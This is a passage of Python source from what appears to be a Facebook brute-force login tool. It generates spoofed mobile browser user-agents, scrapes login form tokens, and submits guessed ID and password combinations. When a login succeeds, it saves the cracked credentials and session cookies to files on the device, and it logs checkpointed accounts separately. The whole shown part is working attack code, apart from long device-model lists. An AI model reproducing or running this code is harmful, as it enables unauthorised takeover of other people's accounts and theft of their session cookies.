'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H')
            sm2 =("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
            oppo1 =("CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979")
            oppo2 =('LMK420Y','LM-V600VML','LM-K315','LM-Q725S','LM-K315','LMK525','LMQ730HA','LM-Q925S','LMX440IM','LMQ730TM','LM-G910EMW','LM-X440ZM','LM-K315IM','LM-Q520N','LM-Q610','LM-Q630N','LMK610IM','LMX440ZM','LMK520','Q710','LMV600VML','LM-X440ZM','LM-K610IM','LMK420H','LMK520, LM-K520','LM-Q610(FGN)','LMG910EMW','LM-K525')
            vivo1 =('vivo 1906','vivo 1938','vivo 1601','vivo 1920','vivo 1801','vivo 1935','vivo 1724','vivo 1901','XQ-BT44','XQ-AT52','XQ-BC52','MI CC9 Pro Premium Edition','Redmi Note 8 Pro','Mi Note 10','MI 8 Explorer Edition','Mi Note 10 Lite')
            ua3 = f"Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sm1))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36","Mozilla/5.0 (iPhone; U; CPU iPhone OS 5_0_1 like Mac OS X; en_US) AppleWebKit (KHTML, like Gecko) Mobile [FBAN/FBForIPhone;FBAV/4.1;FBBV/4100.0;FBDV/iPhone4,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/5.0.1;FBSS/2; FBCR/Three;FBID/phone;FBLC/en_US;FBSF/2.0]"
            uax = random.choice(["Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.1531.64 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/411.0.0.13.36;]","Mozilla/5.0 (Linux; Android 8.1.0; NX609J Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/421.0.0.33.47;]","Mozilla/5.0 (Linux; Android 8.1.0; NX609J Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/437.0.0.35.116;]","Mozilla/5.0 (Linux; Android 8.1.0; NX609J Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111;]","Mozilla/5.0 (Linux; Android 8.1.0; NX609J Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/398.1.0.11.69;]","Mozilla/5.0 (Linux; Android 8.1.0; NX609J Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.86 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/398.0.0.21.105;]","Mozilla/5.0 (Linux; Android 8.1.0; NX609J Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.207 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/446.0.0.27.352;]","Mozilla/5.0 (Linux; Android 13; NX709S Build/TKQ1.221013.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.230 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/447.0.0.24.113;]","Mozilla/5.0 (Linux; Android 13; NX709J Build/TKQ1.221013.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.234 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/447.0.0.24.113;]","Mozilla/5.0 (Linux; Android 13; nubia 8150N Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.193 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/446.0.0.27.352;]","Mozilla/5.0 (Linux; Android 13; NX709S Build/TKQ1.221013.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.230 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/446.0.0.27.352;]","Mozilla/5.0 (Linux; Android 7.1.2; NX627J Build/N2G47O; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]","Mozilla/5.0 (Linux; Android 13; NX711J Build/TKQ1.221220.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.194 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/446.0.0.27.352;]","Mozilla/5.0 (Linux; Android 12; NX666J Build/SKQ1.211113.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.210 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/446.0.0.27.352;]","Mozilla/5.0 (Linux; Android 13; NX709J Build/TKQ1.221013.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.210 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/446.0.0.27.352;]","Mozilla/5.0 (Linux; Android 10; SM-A700S Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.2114.112 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/348.0.0.12.57;]","Mozilla/5.0 (Linux; Android 9; Oneplus A99831 Build/OPR6.142770.293; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.1518.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/343.0.0.[3]54;]","Mozilla/5.0 (Linux; Android 11; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.2318.41 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/136.0.0.14.72;]","Mozilla/5.0 (Linux; Android 9; 22041219I Build/TP1A.904992.769; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.1431.179 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/156.0.0.23.66;]","Mozilla/5.0 (Linux; Android 11; CPH2493 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.1734.2 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/321.0.0.[2]33;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/SD2A.276412.601; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.1576.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/469.0.0.23.21;]","Mozilla/5.0 (Linux; Android 10; Black Shark 4S Build/SP2A.653342.342; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.139.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/334.0.0.15.5;]","Mozilla/5.0 (Linux; Android 11; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.2051.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/486.0.0.21.67;]","Mozilla/5.0 (Linux; Android 9; SM-A700K Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.78.94 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/FBAV/218.0.0.15.17;]","Mozilla/5.0 (Linux; Android 12; Nokia C12 Pro Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.210 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/445.0.0.34.118;]","Mozilla/5.0 (Linux; Android 10; Nokia C3 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.127 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]","Mozilla/5.0 (Linux; Android 10; Nokia C3 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]","Mozilla/5.0 (Linux; Android 9; Nokia C1 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/394.1.0.51.107;]","Mozilla/5.0 (Linux; Android 12; Nokia T21 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.193 Safari/537.36 [FB_IAB/FB4A;FBAV/446.0.0.27.352;]","Mozilla/5.0 (Linux; Android 9; Nokia C2 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.207 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/446.0.0.27.352;]","Mozilla/5.0 (Linux; Android 11; Nokia C20 Plus Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.210 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/446.0.0.27.352;]","Mozilla/5.0 (Linux; Android 10; Nokia C3 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/445.0.0.34.118;]","Mozilla/5.0 (Linux; Android 13; Nokia XR21 Build/TKQ1.220807.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.193 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/445.0.0.34.118;]","Mozilla/5.0 (Linux; Android 10; Nokia C3 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/445.0.0.34.118;]","Mozilla/5.0 (Linux; Android 9; Nokia C1 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.163 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/445.0.0.31.118;]","Mozilla/5.0 (Linux; Android 12; Nokia C12 Pro Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.193 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/445.0.0.34.118;]","Mozilla/5.0 (Linux; Android 13; SM-G781B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.234 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/447.0.0.24.113;]","Mozilla/5.0 (Linux; Android 14; SM-A336B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.230 Mobile Safari/537.36 Instagram 315.0.0.29.109 Android (34/14; 450dpi; 1080x2185; samsung; SM-A336B; a33x; s5e8825; fr_FR; 558601257)","Mozilla/5.0 (Linux; Android 13; SM-A536B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.230 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/447.0.0.24.113;]","Mozilla/5.0 (Linux; Android 13; SM-N981B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.230 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/447.0.0.24.113;]","Mozilla/5.0 (Linux; Android 13; SM-A736B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.230 Mobile Safari/537.36 Instagram 314.0.0.20.114 Android (33/13; 450dpi; 1080x2167; samsung; SM-A736B; a73xq; qcom; tr_TR; 556277184)","Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.230 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/441.0.0.23.113;]","Mozilla/5.0 (Linux; Android 12; DN2101 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.230 Mobile Safari/537.36 Instagram 315.0.0.29.109 Android (31/12; 480dpi; 1080x2161; OnePlus; DN2101; OP515BL1; mt6893; en_US; 558601201)","Mozilla/5.0 (Linux; Android 13; SM-A525F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.230 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/447.0.0.24.113;]","Mozilla/5.0 (Linux; Android 13; FNE-NX9 Build/HONORFNE-N29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.210 Mobile Safari/537.36 Instagram 314.0.0.20.114 Android (33/13; 540dpi; 1080x2316; HONOR; FNE-NX9; HNFNE; qcom; it_IT; 556277184)","Mozilla/5.0 (Linux; Android 14; SM-S918B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.230 Mobile Safari/537.36 Instagram 314.0.0.20.114 Android (34/14; 480dpi; 1080x2097; samsung; SM-S918B; dm3q; qcom; en_GB; 556277184)","(Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.210 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/446.0.0.27.352;]"])
            git_fb = session.get(f"https://{fb}.facebook.com").text
            logn_data = {"lsd":re.search('name="lsd" value="(.*?)"', str(git_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(git_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(git_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(git_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":ids,"pass":pww,"login":"Log In"}
            user_info = {'Host': f'{fb}.facebook.com',
            'Connection': 'keep-alive',
            'Content-Length': '2059',
            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
            'sec-ch-ua-model': '"SM-S928B"',
            'sec-ch-ua-mobile': '?1',
            'User-Agent': scarpping_ua(),
            'viewport-width': '400',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-LSD': 'AVovWh_3iKg',
            'sec-ch-ua-platform-version': '"14.0.0"',
            'X-ASBD-ID': '129477',
            'dpr': '1.8',
            'sec-ch-ua-full-version-list': '"Google Chrome";v="105.0.5195.136", "Not)A;Brand";v="8.0.0.0", "Chromium";v="105.0.5195.136"',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua-platform': '"Android"',
            'Accept': '*/*',
            'Origin': f'https://{fb}.facebook.com',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': f'https://{fb}.facebook.com/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',}
            url = f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
            sxr_respns = session.post(url,data=logn_data, headers=user_info,allow_redirects=False).text
            login_coki=session.cookies.get_dict().keys()
            if 'c_user' in login_coki:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid=re.findall("c_user=(.*);xs", coki)[0]
                ckk=f"https://graph.facebook.com/{uid}/picture?type=normal"
                respns=requests.get(ckk).text
                if 'Photoshop' in respns:
                    print(f"\r\r {b}[SUCCESS-💚] {uid} | {pww}")
                    if 'y' in pmsn_ckki:print(f"\r\r {f}COOKIES : {coki}\n")
                    open('/sdcard/SMILE-RNDM-OK-COOKIE.txt.txt','a').write(uid+'|'+pww+'|'+coki+'\n')
                    open('/sdcard/SMILE-RNDM-OK.txt','a').write(uid+'|'+pww+'\n')
                    oks.append(uid)
                    Elite(uid,pww,coki)
                    break
                else:break
            elif 'checkpoint' in login_coki:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xx=coki.split('checkpoint=')[1]
                uid=re.search('%22%3A(.*?)%2C%22', str(xx)).group(1)
                #print(f"\r\r {c}[SMILE-CP] {uid} | {pww}")
                open('/sdcard/SMILE-RNDM-CP.txt','a').write(uid+'|'+pww+'\n')
                cps.append(uid)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:time.sleep(6)
    except Exception as e:pass
#▬▭▬▭▬▭▬▭[ RANDOM MATHOD - 3 ]▬▭▬▭▬▭▬▭#
#-api
def rndm3(ids,passlist,mthd_svr,fb):
    global loop,oks,cps
    try:
        for pww in passlist:
            sys.stdout.write(f"\r\r {a}[{b}SMILE-M3{a}] {loop}{f}|{b}OK-{str(len(oks))}  {a}|{c}{str(len(cps))}{a}|");sys.stdout.flush()
            sm_mdl=('SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 